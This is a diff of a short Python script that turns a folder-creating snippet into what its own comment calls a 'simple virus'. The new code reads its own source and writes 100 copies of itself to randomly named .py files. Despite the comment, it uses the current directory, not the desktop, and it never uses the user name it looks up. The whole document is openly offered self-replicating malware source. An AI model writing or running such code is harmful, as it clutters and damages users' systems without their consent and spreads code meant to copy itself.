@@ -1,16 +1,22 @@
-import random, string, os, getpass
+# Simple virus that self replicates in user's desktop
+# Modules / Components needed
+from os import getlogin
+from string import ascii_lowercase
+from random import choice
 
-count = 0
-user = getpass.getuser()
+# Variables
+with open(__file__, 'r') as File_Obj:
+	Code = File_Obj.read()
 
-while count < 1:
-	a = random.choice(string.ascii_uppercase)
-	b = random.choice(string.ascii_lowercase)
-	c = random.choice(string.ascii_uppercase)
-	a_2 = random.choice(string.ascii_lowercase)
-	b_2 = random.choice(string.ascii_uppercase)
-	c_2 = random.choice(string.ascii_lowercase)
+User = getlogin()
 
-	abc = a + b + c + a_2 + b_2 + c_2
+# Functions
+def Replicate(File_Name):
+	with open(File_Name, 'w') as File_Obj:
+		File_Obj.write(Code)
 
-	os.mkdir(f"C:/users/{user}/desktop/{abc}")
+Random_String = lambda length:"".join([choice(ascii_lowercase) for x in range(length)]) + ".py"
+
+# Main
+for _ in range(100):
+	Replicate(Random_String(8))
